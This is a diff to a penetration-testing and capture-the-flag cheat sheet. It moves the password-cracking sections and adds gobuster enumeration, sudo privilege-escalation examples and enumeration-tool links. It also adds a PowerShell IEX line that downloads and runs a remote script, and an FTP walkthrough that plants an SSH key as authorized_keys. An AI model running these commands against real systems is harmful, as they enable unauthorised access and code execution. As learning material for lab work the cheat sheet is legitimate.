@@ -31,7 +31,7 @@
   - [Payloads](#payloads)
   - [Shells](#shells)
   - [BufferOverflow](#bufferoverflow)
-  - [Gobuster with Cookie (Useful to directory traversal when cookie is needed )](#gobuster-with-cookie-useful-to-directory-traversal-when-cookie-is-needed-)
+  - [Gobuster](#gobuster)
   - [SQLMAP](#sqlmap)
 - [File Hacking](#file-hacking)
   - [Extract hidden text from PDF Files](#extract-hidden-text-from-pdf-files)
@@ -41,8 +41,6 @@
   - [Caesar Cipher](#caesar-cipher)
   - [Vigenere Cipher](#vigenere-cipher)
   - [One Time Pad Cipher](#one-time-pad-cipher)
-  - [7z Password Cracking](#7z-password-cracking)
-  - [SSH Password Cracking](#ssh-password-cracking)
 - [Forensics](#forensics)
   - [Image File](#image-file)
   - [Binwalk](#binwalk)
@@ -55,6 +53,8 @@
   - [SAM Hashes](#sam-hashes)
   - [Linux User Hashes](#linux-user-hashes)
   - [Hashcat](#hashcat)
+  - [7z Password Cracking](#7z-password-cracking)
+  - [SSH Password Cracking](#ssh-password-cracking)
 - [Privilige Escalation](#privilige-escalation)
   - [Standard Scripts for Enumeration](#standard-scripts-for-enumeration)
   - [Dirtycow](#dirtycow)
@@ -66,6 +66,7 @@
   - [More or Less Command](#more-or-less-command)
   - [Improve Shell](#improve-shell)
   - [Transfer Files from Host to Target Machine](#transfer-files-from-host-to-target-machine)
+  - [FTP](#ftp)
 - [Tools](#tools)
   - [Reconnoitre](#reconnoitre)
 
@@ -373,7 +374,16 @@ To generate shellcode quickly, we can use python `pwn` library.
 > $ (python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh()))" ;cat) | ./vuln
 ```
 
-### Gobuster with Cookie (Useful to directory traversal when cookie is needed )
+### Gobuster
+
+Normal Enumeration.
+
+```
+> $ gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+```
+
+With Cookie (Useful to directory traversal when cookie is needed).
 ```
 > $ gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -c PHPSESSID=<COOKIE_VALUE>
 ===============================================================
@@ -494,13 +504,6 @@ To break Vigenere ciphers without knowing the key.
 ### One Time Pad Cipher
 To solve One Time Pad, Use [OTP](http://rumkin.com/tools/cipher/otp.php).
 
-### 7z Password Cracking
-
-To extract 7z password, Use tool `7z2john`
-
-### SSH Password Cracking
-
-To crack encrypted ssh key use `ssh2john` tool.
 
 ```
 > $ /usr/share/john/ssh2john.py id_rsa > output.hash
@@ -624,10 +627,19 @@ To crack the password, we can use `hashcat` here 500 is for format `$1$` Replace
 > $ hashcat -m 500 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
+### 7z Password Cracking
+
+To extract 7z password, Use tool `7z2john`
+
+### SSH Password Cracking
+
+To crack encrypted ssh key use `ssh2john` tool.
+
 ## Privilige Escalation
 
 ### Standard Scripts for Enumeration
 - [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker) - Linux Privilige Enumeration Checker.
+- [Awesome Priv](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
 - [Lin Enum Script](https://github.com/rebootuser/LinEnum)
 - [Unix Priv Check](https://github.com/pentestmonkey/unix-privesc-check)
 - [Pspy](https://github.com/DominicBreuker/pspy) - Gather information on cron, proceses.
@@ -648,6 +660,7 @@ To check what sudo command can the current user run with no-password.
 ```
 
 Examples:
+
 ```
 > $ sudo -l
 User www-data may run the following commands on bashed:
@@ -658,6 +671,20 @@ We can try like below
 > $ sudo -u enemy /bin/bash
 id
 uid=1001(enemy) gid=1001(enemy) groups=1001(enemy)
+```
+
+```
+> $ sudo -l
+[sudo] password for username: 
+Matching Defaults entries for username on Victim:
+  env_reset, mail_badpass,
+  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+ 
+  User username may run the following commands on Victim:
+    (ALL : ALL) ALL
+> $ cat /root/root.txt
+cat: /root/root.txt: Permission denied  - Does not work
+> $ sudo cat /root/root.txt  - Work
 ```
 
 ### Gain More Privilige on windows system
@@ -763,6 +790,25 @@ www-data@machine:/var/www/html$ export TERM=xterm
 - If Tomcat is Opened, upload the file/payload using the Admin panel.
 - If wordpress is running, upload the file as plugin.
 - In Windows Victim, use `certutil -urlcache -f http://<HOST_IP>/<FILE_NAME> <OUTPUT_FILE_NAME>`
+- In Windows, Using Powershell: `PS C:\Users\User\Desktop> IEX(New-Object Net.WebClient).downloadString('http://<HOST_IP>:8000/jaws-enum.ps1')`
+
+
+### FTP
+
+If we were able to access FTP, we can upload SSH Key to login without password.
+```
+ > $ ftp <HOST_IP>
+Connected to <HOST_IP>.
+220 ProFTPD 1.3.5a Server (Debian) [::ffff:<HOST_IP>]
+Name (<HOST_IP>:root): notch
+331 Password required for notch
+Password:
+230 User notch logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> put id_rsa.pub
+ftp> rename id_rsa.pub authorized_keys
+```
 
 
 ## Tools
@@ -777,6 +823,8 @@ www-data@machine:/var/www/html$ export TERM=xterm
 - [Juice Shop](https://github.com/bkimminich/juice-shop) - Highly vulnerable web app.
 - [OWASP Test Checklist](https://github.com/tanprathan/OWASP-Testing-Checklist) - OWASP Test Checklist.
 - [Pspy](https://github.com/DominicBreuker/pspy) - Information on cronjobs, proceses on target system.
+- [JAWS](https://github.com/411Hall/JAWS) - Windows Enumeration Script.
+- [Cyberchef](https://github.com/gchq/CyberChef) - A web app for encryption, encoding, compression and data analysis.
 
 ### Reconnoitre
 Security tool for multithreaded information gathering and service enumeration whilst building directory structures to store results, along with writing out recommendations for further testing.
